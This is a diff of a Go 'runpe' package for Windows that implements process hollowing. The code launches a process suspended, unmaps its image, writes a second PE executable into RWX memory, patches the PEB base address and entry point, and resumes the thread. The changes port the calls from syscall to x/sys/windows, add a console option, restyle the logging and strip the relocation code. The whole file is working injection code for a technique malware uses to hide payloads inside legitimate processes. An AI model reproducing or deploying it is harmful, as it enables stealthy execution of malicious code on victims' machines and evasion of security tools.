@@ -1,3 +1,4 @@
+//go:build windows && amd64
 // +build windows,amd64
 
 package runpe
@@ -7,62 +8,53 @@ import (
 	"debug/pe"
 	"encoding/binary"
 	"fmt"
+	"golang.org/x/sys/windows"
 	"io/ioutil"
-	"syscall"
 	"unsafe"
 )
 
 type IMAGE_REL_BASED uint16
 
-const (
-	IMAGE_REL_BASED_ABSOLUTE       IMAGE_REL_BASED = 0  //The base relocation is skipped. This type can be used to pad a block.
-	IMAGE_REL_BASED_HIGH           IMAGE_REL_BASED = 1  //The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.
-	IMAGE_REL_BASED_LOW            IMAGE_REL_BASED = 2  //The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.
-	IMAGE_REL_BASED_HIGHLOW        IMAGE_REL_BASED = 3  //The base relocation applies all 32 bits of the difference to the 32-bit field at offset.
-	IMAGE_REL_BASED_HIGHADJ        IMAGE_REL_BASED = 4  //The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word. The low 16 bits of the 32-bit value are stored in the 16-bit word that follows this base relocation. This means that this base relocation occupies two slots.
-	IMAGE_REL_BASED_MIPS_JMPADDR   IMAGE_REL_BASED = 5  //The relocation interpretation is dependent on the machine type.When the machine type is MIPS, the base relocation applies to a MIPS jump instruction.
-	IMAGE_REL_BASED_ARM_MOV32      IMAGE_REL_BASED = 5  //This relocation is meaningful only when the machine type is ARM or Thumb. The base relocation applies the 32-bit address of a symbol across a consecutive MOVW/MOVT instruction pair.
-	IMAGE_REL_BASED_RISCV_HIGH20   IMAGE_REL_BASED = 5  //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the high 20 bits of a 32-bit absolute address.
-	IMAGE_REL_BASED_THUMB_MOV32    IMAGE_REL_BASED = 7  //This relocation is meaningful only when the machine type is Thumb. The base relocation applies the 32-bit address of a symbol to a consecutive MOVW/MOVT instruction pair.
-	IMAGE_REL_BASED_RISCV_LOW12I   IMAGE_REL_BASED = 7  //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V I-type instruction format.
-	IMAGE_REL_BASED_RISCV_LOW12S   IMAGE_REL_BASED = 8  //This relocation is only meaningful when the machine type is RISC-V. The base relocation applies to the low 12 bits of a 32-bit absolute address formed in RISC-V S-type instruction format.
-	IMAGE_REL_BASED_MIPS_JMPADDR16 IMAGE_REL_BASED = 9  //The relocation is only meaningful when the machine type is MIPS. The base relocation applies to a MIPS16 jump instruction.
-	IMAGE_REL_BASED_DIR64          IMAGE_REL_BASED = 10 //The base relocation applies the difference to the 64-bit field at offset.
-)
-
 // Inject starts the src process and injects the target process.
-func Inject(srcPath, destPath string) {
+func Inject(srcPath, destPath string, console bool) {
 
-	cmd, err := syscall.UTF16PtrFromString(srcPath)
+	cmd, err := windows.UTF16PtrFromString(srcPath)
 	if err != nil {
 		panic(err)
 	}
 
-	Log("Creating process: %v", srcPath)
+	Log("[*] Creating process: %v", srcPath)
 
-	si := new(syscall.StartupInfo)
-	pi := new(syscall.ProcessInformation)
+	si := new(windows.StartupInfo)
+	pi := new(windows.ProcessInformation)
 
-	// CREATE_SUSPENDED := 0x00000004
-	err = syscall.CreateProcess(cmd, nil, nil, nil, false, 0x00000004, nil, nil, si, pi)
+	var flag uint32
+	CREATE_SUSPENDED := 0x00000004
+	CREATE_NEW_CONSOLE := 0x00000010
+	if console {
+		flag = uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)
+	} else {
+		flag = uint32(CREATE_SUSPENDED)
+	}
+	err = windows.CreateProcess(cmd, nil, nil, nil, false, flag, nil, nil, si, pi)
 	if err != nil {
 		panic(err)
 	}
 
-	hProcess := uintptr(pi.Process)
-	hThread := uintptr(pi.Thread)
+	hProcess := pi.Process
+	hThread := pi.Thread
 
-	Log("Process created. Process: %v, Thread: %v", hProcess, hThread)
+	Log("[+] Process created. Process: %v, Thread: %v", hProcess, hThread)
 
-	Log("Getting thread context of %v", hThread)
-	ctx, err := GetThreadContext(hThread)
+	Log("[*] Getting thread context of %v", hThread)
+	ctx, err := GetThreadContext(uintptr(hThread))
 	if err != nil {
 		panic(err)
 	}
 	// https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
 	Rdx := binary.LittleEndian.Uint64(ctx[136:])
 
-	Log("Address to PEB[Rdx]: %x", Rdx)
+	Log("[+] Address to PEB[Rdx]: %x", Rdx)
 
 	//https://bytepointer.com/resources/tebpeb64.htm
 	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
@@ -70,9 +62,9 @@ func Inject(srcPath, destPath string) {
 		panic(err)
 	}
 
-	Log("Base Address of Source Image from PEB[ImageBaseAddress]: %x", baseAddr)
+	Log("[+] Base Address of Source Image from PEB[ImageBaseAddress]: %x", baseAddr)
 
-	Log("Reading destination PE")
+	Log("[*] Reading destination PE")
 	destPE, err := ioutil.ReadFile(destPath)
 	if err != nil {
 		panic(err)
@@ -85,35 +77,35 @@ func Inject(srcPath, destPath string) {
 
 	f, err := pe.NewFile(destPEReader)
 
-	Log("Getting OptionalHeader of destination PE")
+	Log("[*] Getting OptionalHeader of destination PE")
 	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
 	if !ok {
 		panic("OptionalHeader64 not found")
 	}
 
-	Log("ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
-	Log("Unmapping view of section %x", baseAddr)
+	Log("[+] ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
+	Log("[*] Unmapping view of section %x", baseAddr)
 	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
 		panic(err)
 	}
 
-	Log("Allocating memory in process at %x (size: %v)", baseAddr, oh.SizeOfImage)
+	Log("[*] Allocating memory in process at %x (size: %v)", baseAddr, oh.SizeOfImage)
 	// MEM_COMMIT := 0x00001000
 	// MEM_RESERVE := 0x00002000
 	// PAGE_EXECUTE_READWRITE := 0x40
-	newImageBase, err := VirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, 0x00002000|0x00001000, 0x40)
+	newImageBase, err := VirtualAllocEx(uintptr(hProcess), baseAddr, oh.SizeOfImage, 0x00002000|0x00001000, 0x40)
 	if err != nil {
 		panic(err)
 	}
-	Log("New base address %x", newImageBase)
-	Log("Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
+	Log("[+] New base address %x", newImageBase)
+	Log("[*] Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
 	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
 	if err != nil {
 		panic(err)
 	}
 
 	for _, sec := range f.Sections {
-		Log("Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
+		Log("[*] Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
 		secData, err := sec.Data()
 		if err != nil {
 			panic(err)
@@ -123,61 +115,11 @@ func Inject(srcPath, destPath string) {
 			panic(err)
 		}
 	}
-	Log("Calcuating relocation delta")
+	Log("[*] Calculating relocation delta")
 	delta := int64(oh.ImageBase) - int64(newImageBase)
-	Log("Relocation delta: %v", delta)
+	Log("[+] Relocation delta: %v", delta)
 
-	if delta != 0 && false {
-		Log("Finding relocation directory")
-		rel := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
-		Log("Relocation directory %x (size: %v)", rel.VirtualAddress, rel.Size)
-
-		Log("Locating relocation section")
-		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
-		if relSec == nil {
-			panic(fmt.Sprintf(".reloc not found at %x", rel.VirtualAddress))
-		}
-		Log("Relocation section %x (size: %v)", relSec.VirtualAddress, relSec.Size)
-		var read uint32
-		d, err := relSec.Data()
-		if err != nil {
-			panic(err)
-		}
-		rr := bytes.NewReader(d)
-		for read < rel.Size {
-			Log("Reading relocation header")
-			dd := new(pe.DataDirectory)
-			binary.Read(rr, binary.LittleEndian, dd)
-			Log("Relocation header %x (size: %v)", dd.VirtualAddress, dd.Size)
-
-			read += 8
-			reSize := (dd.Size - 8) / 2
-			Log("Relocation entries %v", reSize)
-			re := make([]baseRelocEntry, reSize)
-			read += reSize * 2
-			binary.Read(rr, binary.LittleEndian, re)
-			for _, rrr := range re {
-				Log("Relocation entry: Type: %x  Offset: %x", rrr.Type(), rrr.Offset()+dd.VirtualAddress)
-				if rrr.Type() == IMAGE_REL_BASED_DIR64 {
-					rell := newImageBase + uintptr(rrr.Offset()) + uintptr(dd.VirtualAddress)
-					raddr, err := ReadProcessMemoryAsAddr(hProcess, rell)
-					if err != nil {
-						panic(err)
-					}
-
-					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
-					if err != nil {
-						panic(err)
-					}
-
-				} else {
-					Log("Invalid relocation entry type found %v", rrr.Type())
-				}
-			}
-		}
-
-	}
-	Log("Writing new ImageBase to Rdx %x", newImageBase)
+	Log("[*] Writing new ImageBase to Rdx %x", newImageBase)
 	addrB := make([]byte, 8)
 	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
 	err = WriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
@@ -186,15 +128,15 @@ func Inject(srcPath, destPath string) {
 	}
 
 	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
-	Log("Setting new entrypoint to Rcx %x", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
+	Log("[*] Setting new entrypoint to Rcx %x", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
 
-	Log("Setting thread context %v", hThread)
+	Log("[*] Setting thread context %v", hThread)
 	err = SetThreadContext(hThread, ctx)
 	if err != nil {
 		panic(err)
 	}
 
-	Log("Resuming thread %v", hThread)
+	Log("[*] Resuming thread %v", hThread)
 	_, err = ResumeThread(hThread)
 	if err != nil {
 		panic(err)
@@ -203,32 +145,31 @@ func Inject(srcPath, destPath string) {
 }
 
 var (
-	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
+	modkernel32 = windows.NewLazyDLL("kernel32.dll")
 
-	procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
-	procReadProcessMemory  = modkernel32.NewProc("ReadProcessMemory")
-	procVirtualAllocEx     = modkernel32.NewProc("VirtualAllocEx")
-	procGetThreadContext   = modkernel32.NewProc("GetThreadContext")
-	procSetThreadContext   = modkernel32.NewProc("SetThreadContext")
-	procResumeThread       = modkernel32.NewProc("ResumeThread")
+	procVirtualAllocEx   = modkernel32.NewProc("VirtualAllocEx")
+	procGetThreadContext = modkernel32.NewProc("GetThreadContext")
+	procSetThreadContext = modkernel32.NewProc("SetThreadContext")
+	//procResumeThread       = modkernel32.NewProc("ResumeThread")
 
-	modntdll = syscall.NewLazyDLL("ntdll.dll")
+	modntdll = windows.NewLazyDLL("ntdll.dll")
 
 	procNtUnmapViewOfSection = modntdll.NewProc("NtUnmapViewOfSection")
 )
 
-func ResumeThread(hThread uintptr) (count int32, e error) {
+func ResumeThread(hThread windows.Handle) (count int32, e error) {
 
 	// DWORD ResumeThread(
 	// 	HANDLE hThread
 	// );
 
-	ret, _, err := procResumeThread.Call(hThread)
+	ret, err := windows.ResumeThread(hThread)
 	if ret == 0xffffffff {
 		e = err
 	}
+
 	count = int32(ret)
-	Log("ResumeThread[%v]: [%v] %v", hThread, ret, err)
+	Log("[*] ResumeThread[%v]", hThread)
 	return
 }
 
@@ -252,7 +193,7 @@ func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAlloca
 		e = err
 	}
 	addr = ret
-	Log("VirtualAllocEx[%v : %x]: [%v] %v", hProcess, lpAddress, ret, err)
+	Log("[*] VirtualAllocEx[%v : %x]", hProcess, lpAddress)
 
 	return
 }
@@ -270,19 +211,21 @@ func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (da
 	var numBytesRead uintptr
 	data = make([]byte, size)
 
-	r, _, err := procReadProcessMemory.Call(hProcess,
+	err := windows.ReadProcessMemory(windows.Handle(hProcess),
 		lpBaseAddress,
-		uintptr(unsafe.Pointer(&data[0])),
+		&data[0],
 		uintptr(size),
-		uintptr(unsafe.Pointer(&numBytesRead)))
-	if r == 0 {
+		&numBytesRead)
+
+	if err != nil {
 		e = err
 	}
-	Log("ReadProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
+
+	Log("[*] ReadProcessMemory[%v : %x]", hProcess, lpBaseAddress)
 	return
 }
 
-func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
+func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
 
 	// BOOL WriteProcessMemory(
 	// 	HANDLE  hProcess,
@@ -294,15 +237,16 @@ func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, si
 
 	var numBytesRead uintptr
 
-	r, _, err := procWriteProcessMemory.Call(hProcess,
+	err := windows.WriteProcessMemory(hProcess,
 		lpBaseAddress,
-		uintptr(unsafe.Pointer(&data[0])),
+		&data[0],
 		uintptr(size),
-		uintptr(unsafe.Pointer(&numBytesRead)))
-	if r == 0 {
+		&numBytesRead)
+
+	if err != nil {
 		e = err
 	}
-	Log("WriteProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
+	Log("[*] WriteProcessMemory[%v : %x]", hProcess, lpBaseAddress)
 
 	return
 }
@@ -324,33 +268,22 @@ func GetThreadContext(hThread uintptr) (ctx []uint8, e error) {
 	if r == 0 {
 		e = err
 	}
-	Log("GetThreadContext[%v]: [%v] %v", hThread, r, err)
+	Log("[*] GetThreadContext[%v]", hThread)
 
 	return ctx, nil
 }
 
-func ReadProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) (val uintptr, e error) {
-	data, err := ReadProcessMemory(hProcess, lpBaseAddress, 8)
+func ReadProcessMemoryAsAddr(hProcess windows.Handle, lpBaseAddress uintptr) (val uintptr, e error) {
+	data, err := ReadProcessMemory(uintptr(hProcess), lpBaseAddress, 8)
 	if err != nil {
 		e = err
 	}
 	val = uintptr(binary.LittleEndian.Uint64(data))
-	Log("ReadProcessMemoryAsAddr[%v : %x]: [%x] %v", hProcess, lpBaseAddress, val, err)
+	Log("[*] ReadProcessMemoryAsAddr[%v : %x]: [%x]", hProcess, lpBaseAddress, val)
 	return
 }
 
-func WriteProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr, val uintptr) (e error) {
-	buf := make([]byte, 8)
-	binary.LittleEndian.PutUint64(buf, uint64(val))
-	err := WriteProcessMemory(hProcess, lpBaseAddress, buf, 8)
-	if err != nil {
-		e = err
-	}
-	Log("WriteProcessMemoryAsAddr[%v : %x]: %v", hProcess, lpBaseAddress, err)
-	return
-}
-
-func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {
+func NtUnmapViewOfSection(hProcess windows.Handle, baseAddr uintptr) (e error) {
 
 	// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
 	// https://msdn.microsoft.com/en-us/windows/desktop/ff557711
@@ -361,15 +294,15 @@ func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {
 	// 	PVOID     BaseAddress
 	// );
 
-	r, _, err := procNtUnmapViewOfSection.Call(hProcess, baseAddr)
+	r, _, err := procNtUnmapViewOfSection.Call(uintptr(hProcess), baseAddr)
 	if r != 0 {
 		e = err
 	}
-	Log("NtUnmapViewOfSection[%v : %x]: [%v] %v", hProcess, baseAddr, r, err)
+	Log("[*] NtUnmapViewOfSection[%v : %x]", hProcess, baseAddr)
 	return
 }
 
-func SetThreadContext(hThread uintptr, ctx []uint8) (e error) {
+func SetThreadContext(hThread windows.Handle, ctx []uint8) (e error) {
 
 	// BOOL SetThreadContext(
 	// 	HANDLE        hThread,
@@ -377,33 +310,14 @@ func SetThreadContext(hThread uintptr, ctx []uint8) (e error) {
 	// );
 
 	ctxPtr := unsafe.Pointer(&ctx[0])
-	r, _, err := procSetThreadContext.Call(hThread, uintptr(ctxPtr))
+	r, _, err := procSetThreadContext.Call(uintptr(hThread), uintptr(ctxPtr))
 	if r == 0 {
 		e = err
 	}
-	Log("SetThreadContext[%v]: [%v] %v", hThread, r, err)
+	Log("[*] SetThreadContext[%v]", hThread)
 	return
 }
 
 func Log(format string, args ...interface{}) {
 	fmt.Printf(format+"\n", args...)
-}
-
-type baseRelocEntry uint16
-
-func (b baseRelocEntry) Type() IMAGE_REL_BASED {
-	return IMAGE_REL_BASED(uint16(b) >> 12)
-}
-
-func (b baseRelocEntry) Offset() uint32 {
-	return uint32(uint16(b) & 0x0FFF)
-}
-
-func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
-	for _, sec := range secs {
-		if sec.VirtualAddress == va {
-			return sec
-		}
-	}
-	return nil
 }
